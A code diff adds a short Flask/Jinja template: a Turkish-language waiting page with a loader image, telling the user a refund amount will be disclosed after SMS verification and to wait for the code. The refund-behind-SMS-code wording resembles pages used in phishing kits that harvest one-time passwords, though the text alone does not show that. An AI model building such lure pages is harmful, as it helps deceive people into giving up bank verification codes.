@@ -1,0 +1,9 @@
+{% extends "base.html" %}
+{% block content %}
+<fieldset>
+    <div class="loader">
+        <img src="{{ url_for('static', filename='img/form-progress.svg') }}" alt="...">İşleminiz devam ediyor. Lütfen bekleyiniz...
+    </div>
+    <p class="limit-helper">İade Tutarınız size SMS doğrulamasından sonra bildirilecektir. Lütfen doğrulama kodunu bekleyiniz.</p>
+</fieldset>
+{% endblock %}
